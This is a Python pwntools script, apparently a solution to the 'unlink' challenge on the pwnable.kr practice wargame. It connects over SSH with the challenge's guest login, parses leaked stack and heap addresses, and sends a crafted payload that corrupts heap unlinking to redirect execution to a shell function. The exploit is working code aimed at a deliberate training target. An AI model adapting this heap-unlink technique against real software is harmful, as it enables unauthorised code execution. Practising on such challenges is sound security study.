from pwn import *

s = ssh(host='pwnable.kr',user='unlink',password='guest',port=2222)

p =s.process('unlink')

msg = p.recvlines(3)

shell_addr = 0x80484eb

stack_leak = msg[0].split(":")[1] 
heap_leak = msg[1].split(":")[1]

print "[+]Stack leak :"+stack_leak
print "[+]heap leak :"+heap_leak

target_addr = int(stack_leak,16)+16-4
target_val = int(heap_leak,16)+4+8
print "[+]Target addr:"+hex(target_addr)

print "[+] Target value:"+hex(target_val)

#shellcode+"\x90"*(16-len(shellcode)-4)
payload = pack(shell_addr)+"\x90"*12+pack(target_addr)+pack(target_val)

p.sendline(payload)

p.interactive()


